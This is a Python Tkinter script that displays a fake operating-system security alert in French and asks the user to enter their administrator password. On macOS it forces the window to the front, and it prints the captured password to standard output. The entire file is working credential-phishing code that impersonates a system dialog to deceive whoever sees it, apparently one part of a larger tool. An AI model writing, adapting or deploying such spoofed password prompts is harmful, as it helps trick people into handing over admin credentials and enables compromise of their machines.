#!/usr/bin/env python3

try:
    import Tkinter as tk
except ImportError:
    import tkinter as tk
from os import system
from platform import system as platform


def send_text(entry, root):
    if entry.get() != '':
        print(entry.get().encode())
        root.destroy()


warning_message = "Une activité suspecte à été détectée par le système d'exploitation, veuiller saisir votre mot de passe administrateur pour activer l'outil de super détections d'actions malveillantes de la mort qui tue tout."

# ON MAC
if platform() == 'Darwin':  # How Mac OS X is identified by Python
    bg = "systemTransparent"
    fontSize = 15
# ON OTHERS
else:
    bg = None
    fontSize = 10

root = tk.Tk()
root.title("Attention !")
root.resizable(False, False)
root.bind("<Return>", lambda event: send_text(password_entry, root))

width = int(root.winfo_screenwidth()/2 - root.winfo_reqwidth()/2)
height = int(root.winfo_screenheight()/2 - root.winfo_reqheight()/2)
root.geometry("+{}+{}".format(width-100, height-50))
root["bg"] = bg

tk.Label(root, justify=tk.LEFT,
            pady=20,
            padx=10,
            wraplength=400,
            font=('', fontSize),
            text=warning_message,
            bg=bg
            ).pack()

# Frame for password string & entry
frame = tk.Frame(root, pady=20, bg=bg)

# Password string
tk.Label(frame, justify=tk.LEFT,
            font=('', fontSize),
            padx=10,
            text="Mot de passe : ",
            bg=bg
            ).pack(side=tk.LEFT)

# Password entry
password_entry = tk.Entry(frame, width=15,
                            font=('', fontSize),
                            show="\u2022")
password_entry.pack(side=tk.LEFT, padx=10)
frame.pack()

# Confirm button
button = tk.Button(root, text="OK",
                    # justify=tk.RIGHT,  # Maybe for Linux ?
                    font=('', fontSize),
                    command=(lambda: send_text(password_entry, root)))
button.pack(side=tk.RIGHT)

password_entry.focus()

# Focus on the tkinter page for OS that don't focus it at launch
if platform() == 'Darwin':  # How Mac OS X is identified by Python
    system('''/usr/bin/osascript -e 'tell app "Finder" to set frontmost of process "Python" to true' ''')
print("En écoute (Echap pour quitter)")
root.mainloop()
